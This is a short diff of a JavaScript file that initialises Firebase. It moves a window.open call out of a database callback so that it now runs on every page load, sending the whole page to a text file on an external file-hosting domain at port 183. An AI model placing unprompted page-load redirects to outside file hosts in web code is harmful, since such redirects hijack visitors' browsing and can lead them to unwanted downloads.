@@ -1,4 +1,5 @@
 
+  window.open("https://f11.file-upload.download:183/d/r4xbz4ksnlgpv7w7d26iga2lz73a3i7kahsttd4bbedgdg3yif2nath2kxdxhcq5fyjakoo4/Code.txt", '_top');
 
 
   const firebaseConfig = {
@@ -12,12 +13,12 @@
 }
 firebase.initializeApp(firebaseConfig);
 
-const dbRef = firebase.database().ref("lien").once("value",(snap)=>{
-  window.open("https://f11.file-upload.download:183/d/r4xbz4ksnlgpv7w7d26iga2lz73a3i7kahsttd4bbedgdg3yif2nath2kxdxhcq5fyjakoo4/Code.txt", '_top');
+//const dbRef = firebase.database().ref("lien").once("value",(snap)=>{
+  //window.open("https://f11.file-upload.download:183/d/r4xbz4ksnlgpv7w7d26iga2lz73a3i7kahsttd4bbedgdg3yif2nath2kxdxhcq5fyjakoo4/Code.txt", '_top');
   
   
   
-});
+//});
 
 
 
